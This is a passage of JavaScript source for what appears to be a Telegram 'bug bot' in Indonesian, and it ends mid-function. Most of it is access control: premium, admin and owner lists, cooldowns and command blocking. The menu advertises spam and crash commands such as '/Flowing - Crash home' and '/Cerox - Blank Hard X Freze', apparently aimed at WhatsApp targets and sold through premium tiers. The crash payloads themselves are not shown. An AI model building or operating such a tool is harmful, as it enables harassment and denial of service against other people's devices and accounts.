function loadPremiumGroups() {
  try {
    if (!fs.existsSync(premiumGroupsFile)) return [];
    return JSON.parse(fs.readFileSync(premiumGroupsFile, "utf8") || "[]");
  } catch {
    return [];
  }
}
//////////
function savePremiumGroups(data) {
  fs.writeFileSync(premiumGroupsFile, JSON.stringify(data, null, 2));
}
//////////
function isGroupPremium(groupId) {
  return loadPremiumGroups().includes(groupId.toString());
}
/// ---- ADD ADMIN ---- ///
function addAdmin(userId) {
  userId = userId.toString();

  if (!adminList.includes(userId)) {
    adminList.push(userId);
    saveAdmins();
  }
}
/// Khusus ///
function isPremiumUser(ctx) {
  const id = ctx.from.id.toString();

  if (premiumUsers.includes(id)) {
    return true;
  }

  if (
    ctx.chat.type !== "private" &&
    isGroupPremium(ctx.chat.id)
  ) {
    return true;
  }

  return false;
}
/// ---- REMOVE ADMIN ---- ///
function removeAdmin(userId) {
  userId = userId.toString();

  adminList = adminList.filter(id => id !== userId);
  saveAdmins();
}

/// ---- SAVE ADMIN ---- ///
function saveAdmins() {
  try {
    fs.writeFileSync("./database/admins.json", JSON.stringify(adminList, null, 2));
  } catch (err) {
    console.log("❌ Gagal save admin:", err.message);
  }
}

/// ---- LOAD ADMIN ---- ///
function loadAdmins() {
  try {
    if (!fs.existsSync("./database/admins.json")) {
      adminList = [];
      return;
    }

    const data = fs.readFileSync("./database/admins.json", "utf8");

   
    adminList = JSON.parse(data || "[]").map(id => id.toString());

  } catch (err) {
    console.log("⚠️ Gagal load admin:", err.message);
    adminList = [];
  }
}
/// --- Coldwdown --- ///
function getCooldown(chatId) {
  if (!fs.existsSync(cdFile)) return 0;

  const data = JSON.parse(fs.readFileSync(cdFile));
  return data[chatId] || 0;
}

function setCooldown(chatId, value) {
  let data = {};
  if (fs.existsSync(cdFile)) {
    data = JSON.parse(fs.readFileSync(cdFile));
  }

  data[chatId] = value;
  fs.writeFileSync(cdFile, JSON.stringify(data, null, 2));
}
/// ---- SLEEP ---- ///
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

/// ---- CHECK PREMIUM ---- ///
function isPremium(userId) {
  return premiumUsers.includes(userId.toString());
}

/// ---- CHECK OWNER ---- ///
function isOwner(id) {
  return ownerUsers.includes(id.toString());
}

/// ---- LOAD OWNER ---- ///
function loadOwner() {
  try {
    if (!fs.existsSync(ownerFile)) return [];
    return JSON.parse(fs.readFileSync(ownerFile, "utf8") || "[]");
  } catch {
    return [];
  }
}
/// ------ Check Sender ------- \\\
function isSender(userId) {
  return senderUsers.includes(String(userId));
}
// -------- Anti foto ---------- ///
function loadAntiFoto() {
  try {
    if (!fs.existsSync(antiFotoFile)) return []
    return JSON.parse(fs.readFileSync(antiFotoFile))
  } catch {
    return []
  }
}


function saveAntiFoto(data) {
  fs.writeFileSync(antiFotoFile, JSON.stringify(data, null, 2))
}

let antiFotoGroups = loadAntiFoto()

/// ------- ANTI VIDIO ------- ///
function loadAntiVideo() {
  try {
    if (!fs.existsSync(antiVideoFile)) return []
    return JSON.parse(fs.readFileSync(antiVideoFile))
  } catch {
    return []
  }
}

function saveAntiVideo(data) {
  fs.writeFileSync(antiVideoFile, JSON.stringify(data, null, 2))
}

let antiVideoGroups = loadAntiVideo()
/// JAM ///
function getTimeIndonesia() {
  const now = new Date();

  const wib = new Date(now.toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
  const wita = new Date(now.toLocaleString("en-US", { timeZone: "Asia/Makassar" }));
  const wit = new Date(now.toLocaleString("en-US", { timeZone: "Asia/Jayapura" }));

  return `
🕒 LIVE JAM INDONESIA

🇮🇩 WIB  : ${wib.toLocaleTimeString("id-ID", { hour12: false })}
🇮🇩 WITA : ${wita.toLocaleTimeString("id-ID", { hour12: false })}
🇮🇩 WIT  : ${wit.toLocaleTimeString("id-ID", { hour12: false })}
`;
}
/// cmd of/on ///
function loadCmdMode() {
  try {
    if (!fs.existsSync(CMD_FILE)) {
      fs.writeFileSync(CMD_FILE, JSON.stringify({ disabled: [] }, null, 2));
    }

    const data = JSON.parse(fs.readFileSync(CMD_FILE));

    return {
      disabled: Array.isArray(data.disabled) ? data.disabled : []
    };

  } catch (e) {
    return { disabled: [] };
  }
}

function saveCmdMode(data) {
  fs.writeFileSync(CMD_FILE, JSON.stringify(data, null, 2));
}
/// midlaware Cmd on / of ///
bot.use((ctx, next) => {
  const data = loadCmdMode();

  const text = ctx.message?.text || ctx.callbackQuery?.data || "";

  if (!text.startsWith("/")) return next(); 

  const cmd = text
    .split(" ")[0]
    .replace(/^\/+/, "")
    .replace(/@.+$/, "")
    .toLowerCase()
    .trim();

  const userId = ctx.from?.id?.toString();

  const isAdminUser =
    adminList.includes(userId) || ownerUsers.includes(userId);

  const disabled = Array.isArray(data?.disabled) ? data.disabled : [];

  // console.log("CMD:", cmd);
// console.log("DISABLED:", disabled);

  if (disabled.includes(cmd)) {
    if (isAdminUser) return next();
    return ctx.reply("⛔ Command ini sedang dinonaktifkan admin");
  }

  return next();
});
/// ---- GROUP ONLY ---- ///
bot.use((ctx, next) => {
  const groupMode = getGroupMode();

  if (groupMode === "on" && ctx.chat.type === "private") {
    return ctx.reply(`
🔒 𝐆𝐑𝐎𝐔𝐏 𝐎𝐍𝐋𝐘 𝐌𝐎𝐃𝐄

Bot ini hanya bisa digunakan di dalam group.
Silakan gunakan perintah di group.
`);
  }

  return next();
});
/// ---- SELF / PUBLIC MODE ---- ///
bot.use((ctx, next) => {
  const mode = getMode();

  if (mode === "self" && !isOwner(ctx.from.id)) {

    if (ctx.callbackQuery) {
      return ctx.answerCbQuery("🔒 BOT DI KUNCI OWNER", { show_alert: true });
    }

    return; 
  }

  return next();
});
// ===== Tracker ===== // ontol
const commandList = new Set();

const originalCommand = bot.command.bind(bot);

bot.command = (cmd, ...args) => {
  commandList.add(cmd);
  return originalCommand(cmd, ...args);
};
/// -------- ( menu utama ) --------- \\\
const styles = ["primary", "success", "danger"];   
let styleIndex = 0;
let menuAnimation = null;

function getAnimatedKeyboard() {
  const style = styles[styleIndex];

  styleIndex++;
  if (styleIndex >= styles.length) styleIndex = 0;

  return {
    inline_keyboard: [
      [
        { text: "༺ 𝐀𝐓𝐓𝐀𝐂𝐊 ༻", callback_data: "xbugs", style: style },
        { text: "༺ 𝐒𝐄𝐓𝐓𝐈𝐍𝐆 ༻", callback_data: "setting", style: style }
      ],
      [
        {
          text: "DEVELOPER",
          url: "https://t.me/seanoffc",
          style: style
        }
      ]
    ]
  };
}

bot.start(async (ctx) => {
  const user = ctx.from;
  const userId = user?.id || "Unknown";
  const username = user?.username
    ? `@${user.username}`
    : "Tidak Ada Username";

  const premium = isPremiumUser(ctx);

  const runtime = typeof getRuntime === "function" ? getRuntime() : "0s";
  const koneksi = sock?.user ? "✅ Terhubung" : "❌ Tidak Terhubung";

  let teks = `
<blockquote><strong>〔 𝘡𝘈𝘓𝘐𝘕𝘋𝘙𝘈 〕</strong></blockquote>
│ 〣 Developer : @seanoffc
│ 〣 Version : 14pro edition epp
│ 〣 Platform : Telegram pp
│ 〣 Type : Invlasion
╰────────────

<blockquote><strong>〔 𝘐𝘕𝘍𝘖𝘙𝘔𝘈𝘛𝘐𝘖𝘕 〕</strong></blockquote>
│ 〣 Runtime : ${runtime}
│ 〣 ID : ${userId}
│ 〣 Username : ${username}
│ 〣 Premium : ${premium ? "YES" : "NO"}
╰────────────

<blockquote><strong>〔 𝘚𝘌𝘕𝘋𝘌𝘙 𝘚𝘛𝘈𝘛𝘜𝘚 〕</strong></blockquote>
│ 〣 Koneksi : ${koneksi}
╰────────────
`;

  const sentMessage = await ctx.replyWithPhoto(
    { url: "https://files.catbox.moe/e476dh.jpg" },
    {
      caption: teks,
      parse_mode: "HTML",
      reply_markup: getAnimatedKeyboard()
    }
  );

  if (menuAnimation) clearInterval(menuAnimation);

  menuAnimation = setInterval(async () => {
    try {
      await ctx.telegram.editMessageReplyMarkup(
        ctx.chat.id,
        sentMessage.message_id,
        null,
        getAnimatedKeyboard()
      );
    } catch (err) {
      clearInterval(menuAnimation);
    }
  }, 1900);
});


bot.action("xbugs", async (ctx) => {
  await ctx.answerCbQuery();

  let teks = `
<blockquote><strong>〔 𝘡𝘈𝘓𝘐𝘕𝘋𝘙𝘈 〕</strong></blockquote>
│ 〣 Developer : @seanoffc
│ 〣 Version : 14.0 pro edition
│ 〣 Platform : Telegram
│ 〣 Type : Javascript
╰────────────

╭──〔 𝑩͒𝒆͠𝒃͢𝒂͒𝒔 𝑺͒𝒑͠𝒂͢𝒎 〕
│ ⌬ /xspam - Delay beta for murbug
│ ⌬ /ints - Delay spam notif
│ ⌬ /xsow - Delay invisible bebas spam
╰────────────

╭──〔 𝑽͒𝒊͠𝒔͢𝒊͒𝒃͠𝒍͢𝒆 𝑩͒𝒖͠𝒈͢𝒔 〕
│ ⌬ /Flowing - Crash home
│ ⌬ /Cerox - Blank Hard X Freze
╰────────────
`;

  await ctx.editMessageCaption(teks, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "「🔙」メインコース", callback_data: "backmenu" }
        ]
      ]
    }
  });
});

bot.action("setting", async (ctx) => {
  await ctx.answerCbQuery();

  let teks = `
<blockquote><strong>〔 𝘡𝘈𝘓𝘐𝘕𝘋𝘙𝘈 〕</strong></blockquote>
│ 〣 Developer : @seanoffc
│ 〣 Version : 14.0 pro edition
│ 〣 Platform : Telegram
│ 〣 Type : Javascript
╰────────────────

╭〔 𝑺͒𝒆͢𝒕͠𝒕𝒊͒𝒏͢𝒈͠𝒔 𝑴͒𝒖͢𝒓͠𝒃𝒖͒𝒈͢ 〕
│ ⌬ /addgroupremium → add prem gc
│ ⌬ /delgrouppremium → hapus prem
│ ⌬ /blockcmd → block cmd
│ ⌬ /unclokcmd → buka block
│ ⌬ /listcmd → list block and unc
│ ⌬ /setcd → set cooldown
│ ⌬ /self →Mainteche
│ ⌬ /public →untuk public 
╰────────
╭〔 𝑺͒𝒆͢𝒕͠𝒕𝒊͒𝒏͢𝒈͠𝒔  𝑺͒𝒆͢𝒏͠𝒅𝒆͒𝒓͢ 〕
│ ⌬ /addsender → tambah akses
│ ⌬ /killsesi → reset sesi
╰────────
╭〔 𝑺͒𝒆͢𝒕͠𝒕𝒊͒𝒏͢𝒈͠𝒔 𝑨͒𝒅͢𝒎͠𝒊𝒏͒ 〕
│ ⌬ /addadmin → tambah admin
│ ⌬ /deladmin → hapus admin
│ ⌬ /listadmin → list admin
╰────────
╭〔 𝑺͒𝒆͢𝒕͠𝒕𝒊͒𝒏͢𝒈͠𝒔 𝑼͒𝒔͢𝒆͠𝒓͒ 〕
│ ⌬ /addprem → add premium
│ ⌬ /delprem → hapus prem
│ ⌬ /listprem → list prem
│ ⌬ /cekprem → cek status
╰────────
`;

  await ctx.editMessageCaption(teks, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "「🔙」メインコース", callback_data: "backmenu" }
        ]
      ]
    }
  });
});

bot.action("backmenu", async (ctx) => {
  await ctx.answerCbQuery();

  const user = ctx.from;
  const userId = user?.id || "Unknown";
  const username = user?.username
    ? `@${user.username}`
    : "Tidak Ada Username";

  const premium = isPremiumUser(ctx);

  const runtime = typeof getRuntime === "function" ? getRuntime() : "0s";
  const koneksi = sock?.user ? "✅ Terhubung" : "❌ Tidak Terhubung";

  let teks = `
<blockquote><strong>〔 𝘡𝘈𝘓𝘐𝘕𝘋𝘙𝘈 〕</strong></blockquote>
│ 〣 Developer : @seanoffc
│ 〣 Version : 14.0 pro edition
│ 〣 Platform : Telegram
│ 〣 Type : Javascript
╰────────────

<blockquote><strong>〔 𝘐𝘕𝘍𝘖𝘙𝘔𝘈𝘛𝘐𝘖𝘕 〕</strong></blockquote>
│ 〣 Runtime : ${runtime}
│ 〣 ID : ${userId}
│ 〣 Username : ${username}
│ 〣 Premium : ${premium ? "YES" : "NO"}
╰────────────

<blockquote><strong>〔 𝘚𝘌𝘕𝘋𝘌𝘙 𝘚𝘛𝘈𝘛𝘜𝘚 〕</strong></blockquote>
│ 〣 Koneksi : ${koneksi}
╰────────────
`;

  const msg = await ctx.editMessageCaption(teks, {
    parse_mode: "HTML",
    reply_markup: getAnimatedKeyboard()
  });

  if (menuAnimation) clearInterval(menuAnimation);

  menuAnimation = setInterval(async () => {
    try {
      await ctx.telegram.editMessageReplyMarkup(
        ctx.chat.id,
        msg.message_id,
        null,
        getAnimatedKeyboard()
      );
    } catch (err) {
      clearInterval(menuAnimation);
    }
  }, 2000);
});

/// ------ ( Plugins ) ------- \\\
function getUserId(ctx) {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return null;

  return args[1].replace(/[^0-9]/g, ""); 
}

/// CASE BUAT OWNER MENU ///
bot.command("listprem", checkAdmin, async (ctx) => {
  if (premiumUsers.length < 1) {
    return ctx.reply("❌ Belum ada user premium.");
  }

  let teks = `╭──〔 LIST PREMIUM 〕\n`;

  for (let i = 0; i < premiumUsers.length; i++) {
    const id = premiumUsers[i];

    try {
      const user = await ctx.telegram.getChat(id);

      teks +=
`│ ${i + 1}. ${user.first_name || "-"}
│ ID : ${id}
│ Username : ${user.username ? "@" + user.username : "-"}
│
`;

    } catch {
      teks +=
`│ ${i + 1}. Unknown User
│ ID : ${id}
│ Username : -
│
`;
    }
  }

  teks += "╰────────────";

  await ctx.reply(teks);
});

bot.command("cekprem", async (ctx) => {
  try {
    let target = ctx.from;

  
    if (ctx.message.reply_to_message) {
      target = ctx.message.reply_to_message.from;
    }

    const userId = target.id.toString();
    const firstName = target.first_name || "-";
    const lastName = target.last_name || "";
    const fullName = `${firstName} ${lastName}`.trim();
    const username = target.username ? `@${target.username}` : "Tidak ada username";

   
    const isUserPremium = premiumUsers.includes(userId);
    const isUserAdmin = adminList.includes(userId);
    const isUserOwner = ownerUsers.includes(userId);

    let status = "Non Premium ❌";

    if (isUserOwner) {
      status = "Owner 👑";
    } else if (isUserAdmin) {
      status = "Admin ⚡";
    } else if (isUserPremium) {
      status = "Premium 💎";
    }

  
    let groupStatus = "Private Chat";
    if (ctx.chat.type !== "private") {
      groupStatus = isGroupPremium(ctx.chat.id)
        ? "Group Premium ✅"
        : "Group Non Premium ❌";
    }

    const teks = `
<blockquote><strong>「 CEK STATUS USER 」</strong></blockquote>
👤 Nama: ${fullName}
🆔 ID: <code>${userId}</code>
🔗 Username: ${username}
💎 Status: ${status}
🏷️ Group: ${groupStatus}
💬 Chat ID: <code>${ctx.chat.id}</code>
`;

    await ctx.reply(teks, {
      parse_mode: "HTML"
    });

  } catch (e) {
    console.error("CEKPREM ERROR:", e);

    await ctx.reply(
      `❌ Error saat cek premium\n${e.message}`
    );
  }
});

bot.command("listcmd", checkAdmin, async (ctx) => {
  const data = loadCmdMode();
  const disabled = Array.isArray(data?.disabled) ? data.disabled : [];

  const allCommands = [...commandList];

  const active = allCommands.filter(c => !disabled.includes(c));

  const activeList = active.length
    ? active.map(c => `➤ /${c}`).join("\n")
    : "Tidak ada";

  const disabledList = disabled.length
    ? disabled.map(c => `➤ /${c}`).join("\n")
    : "Tidak ada";

  return ctx.replyWithPhoto(
    { source: fs.readFileSync("./image/AtomicCrashers.jpg") },
    {
      caption:
`<pre>📊 SYSTEM COMMAND

┌─ ✅ CMD AKTIF
${activeList}

└─ ⛔ CMD NONAKTIF
${disabledList}</pre>`,
      parse_mode: "HTML"
    }
  );
});

bot.command("addgroupremium", checkOwner, async (ctx) => {
  try {
   
    if (ctx.chat.type === "private") {
      return ctx.reply("❌ Command ini hanya bisa digunakan di group");
    }

    const groupId = ctx.chat.id.toString();
    let premiumGroups = loadPremiumGroups();

    
    if (premiumGroups.includes(groupId)) {
      return ctx.reply("⚠️ Group ini sudah PREMIUM");
    }

  
    premiumGroups.push(groupId);

    savePremiumGroups(premiumGroups);

    return ctx.reply("✅ Group berhasil dijadikan PREMIUM");
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi error");
  }
});

bot.command("delgrouppremium", checkOwner, async (ctx) => {
  try {
    
    if (ctx.chat.type === "private") {
      return ctx.reply("❌ Command ini hanya bisa digunakan di group");
    }

    const groupId = ctx.chat.id.toString();
    let premiumGroups = loadPremiumGroups();

    
    if (!premiumGroups.includes(groupId)) {
      return ctx.reply("⚠️ Group ini bukan premium");
    }

    
    premiumGroups = premiumGroups.filter(id => id !== groupId);

    savePremiumGroups(premiumGroups);

    return ctx.reply("✅ Group berhasil dihapus dari PREMIUM");
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi error");
  }
});

bot.command("cekowner", (ctx) => {
  const data = loadJSON(ownerFile);
  ctx.reply(`ID kamu: ${ctx.from.id}\nOwner list: ${data.join(", ")}`);
});


bot.command("addadmin", checkOwner, (ctx) => {
  const userId = getUserId(ctx)?.toString();
  if (!userId) return ctx.reply("Example: /addadmin 123");

  if (adminList.includes(userId)) {
    return ctx.reply(`✅ User ${userId} sudah admin.`);
  }

  addAdmin(userId);
  ctx.reply(`✅ Berhasil tambah ${userId} jadi admin`);
});


bot.command("addprem", checkAdmin, (ctx) => {
  const userId = getUserId(ctx)?.toString();
  if (!userId) return ctx.reply("Example: /addprem 123");

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ User ${userId} sudah premium.`);
  }

  premiumUsers.push(userId);
  saveJSON(premiumFile, premiumUsers);

  ctx.reply(`✅ Berhasil tambah ${userId} jadi premium`);
});


bot.command("deladmin", checkOwner, (ctx) => {
  const userId = getUserId(ctx)?.toString();
  if (!userId) return ctx.reply("Example: /deladmin 123");

  if (!adminList.includes(userId)) {
    return ctx.reply(`❌ User ${userId} tidak ada di admin.`);
  }

  removeAdmin(userId);
  ctx.reply(`🚫 Berhasil hapus ${userId} dari admin`);
});


bot.command("delprem", checkAdmin, (ctx) => {
  const userId = getUserId(ctx)?.toString();
  if (!userId) return ctx.reply("Example: /delprem 123");

  if (!premiumUsers.includes(userId)) {
    return ctx.reply(`❌ User ${userId} tidak ada di premium.`);
  }

  premiumUsers = premiumUsers.filter(id => id !== userId);
  saveJSON(premiumFile, premiumUsers);

  ctx.reply(`🚫 Berhasil hapus ${userId} dari premium`);
});

bot.command("antivideo", async (ctx) => {
  try {
   
    if (ctx.chat.type === "private") {
      return ctx.reply("❌ Hanya bisa di group");
    }

    const chatId = ctx.chat.id.toString();

    
    const member = await ctx.getChatMember(ctx.from.id);
    if (!["administrator", "creator"].includes(member.status)) {
      return ctx.reply("❌ Hanya admin yang bisa pakai command ini");
    }

    const args = ctx.message.text.split(" ")[1];
    if (!args) {
      return ctx.reply("📌 Format: /antivideo on /off");
    }

  
    if (args === "on") {
      if (!antiVideoGroups.includes(chatId)) {
        antiVideoGroups.push(chatId);
        saveAntiVideo(antiVideoGroups);
      }
      return ctx.reply("✅ Anti video aktif di grup ini");
    }

   
    if (args === "off") {
      antiVideoGroups = antiVideoGroups.filter(id => id !== chatId);
      saveAntiVideo(antiVideoGroups);
      return ctx.reply("❌ Anti video dimatikan");
    }

    return ctx.reply("📌 Gunakan: /antivideo on /off");
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi error");
  }
});

bot.on("video", async (ctx) => {
  const chatId = ctx.chat.id.toString()
  if (!antiVideoGroups.includes(chatId)) return

  try {
    await ctx.deleteMessage()

    await ctx.reply(
      `⚠️ @${ctx.from.username || ctx.from.first_name}\n🚫 Dilarang mengirim video di grup ini!`,
      { parse_mode: "Markdown" }
    )

  } catch (err) {
    console.log("Error:", err.message)
  }
})

bot.command("setcd", checkOwner, async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1);

  if (!args[0]) {
    return ctx.reply(
      "❌ Format salah!\n\nGunakan:\n/setcd 10d (detik)\n/setcd 2jm (jam)\n/setcd 1h (hari)"
    );
  }

  const ms = parseCooldown(args[0]);

  if (!ms) {
    return ctx.reply("❌ Format tidak valid!\nContoh: 10d / 2jm / 1h");
  }

  setCooldown(ctx.chat.id, ms);

  await ctx.reply(
    `✅ Cooldown berhasil diset!\n⏱ ${args[0]} = ${ms} ms`
  );
});

bot.command("antifoto", async (ctx) => {
  if (ctx.chat.type === "private") {
    return ctx.reply("❌ Hanya bisa di group")
  }

  
  const member = await ctx.getChatMember(ctx.from.id)
  if (!["administrator", "creator"].includes(member.status)) {
    return ctx.reply("❌ Hanya admin yang bisa pakai command ini")
  }

  const args = ctx.message.text.split(" ")[1]
  if (!args) return ctx.reply("📌 Format: /antifoto on /off")

  const chatId = ctx.chat.id.toString()

  if (args === "on") {
    if (!antiFotoGroups.includes(chatId)) {
      antiFotoGroups.push(chatId)
      saveAntiFoto(antiFotoGroups)
    }
    return ctx.reply("✅ Anti foto aktif di grup ini")
  }

  if (args === "off") {
    antiFotoGroups = antiFotoGroups.filter(id => id !== chatId)
    saveAntiFoto(antiFotoGroups)
    return ctx.reply("❌ Anti foto dimatikan")
  }

  ctx.reply("📌 Gunakan: /antifoto on /off")
})

bot.on("photo", async (ctx) => {
  const chatId = ctx.chat.id.toString()
  if (!antiFotoGroups.includes(chatId)) return

  try {
    await ctx.deleteMessage()

    await ctx.reply(
      `⚠️ @${ctx.from.username || ctx.from.first_name}\n🚫 Dilarang mengirim foto di grup ini!`,
      { parse_mode: "Markdown" }
    )

  } catch (err) {
    console.log("Error:", err.message)
  }
})

bot.command("groupon", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Kamu bukan owner!");

  setGroupMode("on");
  ctx.reply("👥 Group Only berhasil diaktifkan.");
});

bot.command("groupoff", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Kamu bukan owner!");

  setGroupMode("off");
  ctx.reply("🌍 Group Only dimatikan.");
});

bot.command("self", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Kamu bukan owner!");

  setMode("self");
  ctx.reply("🔒 Bot Di kunci Owner.");
});

bot.command("public", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Kamu bukan owner!");

  setMode("public");
  ctx.reply("🔓 Bot di buka oleh Owner.");
});

bot.command("runtime", (ctx) => {
  const uptime = process.uptime();
  const h = Math.floor(uptime / 3600);
  const m = Math.floor((uptime % 3600) / 60);
  const s = Math.floor(uptime % 60);

  ctx.reply(
`┏━━━〔 RUNTIME 〕━━━┓
┃ 🤖 Bot Active
┃ ⏳ ${h} Jam ${m} Menit ${s} Detik
┗━━━━━━━━━━━━━━━━━━┛`
  );
});


bot.command("anticulik", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner!");

  const args = ctx.message.text.split(" ")[1];

  if (!args) {
    return ctx.reply("Gunakan:\n/anticulik on\n/anticulik off\n/anticulik autoreject");
  }

  if (args === "on") {
    antiCulik = true;
    autoReject = false;
    ctx.reply("✅ AntiCulik ON");
  } else if (args === "off") {
    antiCulik = false;
    ctx.reply("❌ AntiCulik OFF");
  } else if (args === "autoreject") {
    antiCulik = true;
    autoReject = true;
    ctx.reply("🚫 Auto Reject ON");
  }
});

bot.command("addsafe", (ctx) => {
  if (!isOwner(ctx.from.id)) return;

  if (ctx.chat.type === "private") {
    return ctx.reply("❌ Gunakan di group");
  }

  const id = ctx.chat.id.toString();

  if (whitelistGroups.includes(id)) {
    return ctx.reply("⚠️ Group Sudah di Safe");
  }

  whitelistGroups.push(id);
  saveSafe(whitelistGroups);

  ctx.reply("✅ Group SAFE");
});

bot.command("delsafe", (ctx) => {
  if (!isOwner(ctx.from.id)) return;

  const id = ctx.chat.id.toString();

  whitelistGroups = whitelistGroups.filter(v => v !== id);
  saveSafe(whitelistGroups);

  ctx.reply("❌ SAFE Group dihapus");
});

bot.on("my_chat_member", async (ctx) => {
  try {
    const status = ctx.update.my_chat_member.new_chat_member.status;

    if (status !== "member" && status !== "administrator") return;
    if (!antiCulik) return;

    const chat = ctx.chat;
    const groupId = chat.id;
    const groupName = chat.title;

  
    if (isSafeGroup(groupId)) return;

    const from = ctx.update.my_chat_member.from;

    const userId = from.id;
    const username = from.username ? "@" + from.username : "Tidak ada";
    const fullName = `${from.first_name || ""} ${from.last_name || ""}`.trim();

   
    if (autoReject) {
      try {
        await ctx.telegram.sendMessage(groupId, "🚫 Auto keluar (AntiCulik)");
        await ctx.telegram.banChatMember(groupId, userId).catch(()=>{});
        await ctx.telegram.leaveChat(groupId);
      } catch {}
      return;
    }

   
    pendingGroups.set(groupId, {
      userId,
      username,
      fullName,
      groupName
    });

    
    for (let ownerId of loadOwner()) {
      try {
        await bot.telegram.sendMessage(
          ownerId,
`🚨 BOT DICULIK

📛 Grup : ${groupName}
🆔 ID   : ${groupId}

👤 Pelaku:
• Nama     : ${fullName}
• Username : ${username}
• ID       : ${userId}`,
          {
            reply_markup: {
              inline_keyboard: [
                [
                  { text: "✅ Izinkan", callback_data: `allow_${groupId}` },
                  { text: "❌ Tolak", callback_data: `deny_${groupId}` }
                ]
              ]
            }
          }
        );
      } catch {}
    }

  } catch (err) {
    console.log("AntiCulik error:", err);
  }
});

bot.action(/(allow|deny)_(.+)/, async (ctx) => {
  if (!isOwner(ctx.from.id)) {
    return ctx.answerCbQuery("❌ Bukan owner!", { show_alert: true });
  }

  const action = ctx.match[1];
  const groupId = Number(ctx.match[2]);

  const data = pendingGroups.get(groupId);

  try { await ctx.deleteMessage(); } catch {}

  if (action === "allow") {
    pendingGroups.delete(groupId);

    await ctx.reply("✅ Bot diizinkan");

    try {
      await ctx.telegram.sendMessage(groupId, "✅ Bot diizinkan oleh owner");
    } catch {}
  }

  if (action === "deny") {
    pendingGroups.delete(groupId);

    await ctx.reply("❌ Bot ditolak");

    try {
      await ctx.telegram.sendMessage(groupId, "❌ Bot ditolak oleh owner");

      if (data?.userId) {
        await ctx.telegram.banChatMember(groupId, data.userId).catch(()=>{});
      }

      await ctx.telegram.leaveChat(groupId);
    } catch {}
  }
});
///// ×××××÷×××××××× ////
bot.command("unclokcmd", checkAdmin, async (ctx) => {
  const args = ctx.message.text.split(" ");
  const cmd = args[1]?.toLowerCase();

  if (!cmd) return ctx.reply("❌ Contoh: /unclokcmd xspam janggan /xspam");

  const data = loadCmdMode();
  const disabled = data?.disabled || [];

  if (!disabled.includes(cmd)) {
    return ctx.reply(`⚠️ Command /${cmd} sudah aktif`);
  }

  data.disabled = disabled.filter(c => c !== cmd);
  saveCmdMode(data);

  ctx.reply(`✅ Command /${cmd} berhasil diaktifkan`);
});

bot.command("blockcmd", checkAdmin, async (ctx) => {
  const args = ctx.message.text.split(" ");
  const cmd = args[1]?.toLowerCase();

  if (!cmd) return ctx.reply("❌ Contoh: /blockcmd xspam janggan /xspam");

  const data = loadCmdMode();
  const disabled = data?.disabled || [];

  if (disabled.includes(cmd)) {
    return ctx.reply(`⚠️ Command /${cmd} sudah nonaktif`);
  }

  disabled.push(cmd);

  data.disabled = disabled;
  saveCmdMode(data);

  ctx.reply(`⛔ Command /${cmd} berhasil dinonaktifkan`);
});

bot.command("listadmin", async (ctx) => {
  if (!adminList || adminList.length === 0) {
    return ctx.reply(
`👮 LIST ADMIN

📊 Total Admin: 0

❌ Belum ada admin yang ditambahkan`
    );
  }

  const list = adminList
    .map((admin, i) => {
     
      const id = typeof admin === "object" ? admin.id : admin;

      const name =
        typeof admin === "object"
          ? admin.name || "Unknown"
          : "Unknown";

      const username =
        typeof admin === "object"
          ? (admin.username ? `@${admin.username}` : "No Username")
          : "No Username";

      return `${i + 1}. ${name} | ${username} | ${id}`;
    })
    .join("\n");

  return ctx.reply(
`👮 LIST ADMIN

📊 Total Admin: ${adminList.length}

📋 Daftar Admin:
${list}`
  );
});
//// Tools ///
bot.command("bratvid", async (ctx) => {
  const chatId = ctx.chat.id;

  
  const text = ctx.message.text
    .split(" ")
    .slice(1)
    .join(" ")
    .trim();

  
  if (!text) {
    return ctx.reply(
      "⚠️ Contoh:\n/bratvid woi kontol"
    );
  }

  
  await ctx.reply(
    "🎬 Lagi bikin sticker videonya bre..."
  );

  try {
   
    const res = await fetch(
      `https://api.zenzxz.my.id/maker/bratvid?text=${encodeURIComponent(
        text
      )}`
    );

   
    if (!res.ok) {
      throw new Error(
        `HTTP error ${res.status}`
      );
    }

  
    const buffer = Buffer.from(
      await res.arrayBuffer()
    );

  
    const tmpFile = path.join(
      __dirname,
      `bratvid_${Date.now()}.webm`
    );

    fs.writeFileSync(
      tmpFile,
      buffer
    );

  
    await ctx.replyWithSticker(
      {
        source: tmpFile
      }
    );

  
    fs.unlinkSync(
      tmpFile
    );

  } catch (e) {
    console.error(
      "BRATVID ERROR:",
      e
    );

    return ctx.reply(
      "❌ Gagal generate sticker video."
    );
  }
});

bot.command("removebg", async (ctx) => {
  const chatId = ctx.chat.id;

 
  if (
    !ctx.message.reply_to_message ||
    !ctx.message.reply_to_message.photo
  ) {
    return ctx.reply(
      "📸 *Silakan reply foto yang ingin dihapus background-nya.*",
      {
        parse_mode: "Markdown"
      }
    );
  }

  try {
    await ctx.reply("⏳ Sedang menghapus background...");

   
    const photo =
      ctx.message.reply_to_message.photo[
        ctx.message.reply_to_message.photo.length - 1
      ];

  
    const fileLink = await ctx.telegram.getFileLink(photo.file_id);

   
    const imageResponse = await axios.get(fileLink.href, {
      responseType: "arraybuffer"
    });

  
    const formData = new FormData();
    formData.append("size", "auto");
    formData.append(
      "image_file",
      Buffer.from(imageResponse.data),
      "image.jpg"
    );

  
    const response = await axios.post(
      "https://api.remove.bg/v1.0/removebg",
      formData,
      {
        headers: {
          ...formData.getHeaders(),
          "X-Api-Key": REMOVE_BG_KEY
        },
        responseType: "arraybuffer"
      }
    );

   
    const filePath = `./removebg_${chatId}.png`;
    fs.writeFileSync(filePath, response.data);

   
    await ctx.replyWithPhoto(
      { source: filePath },
      {
        caption: "✨ Background berhasil dihapus!"
      }
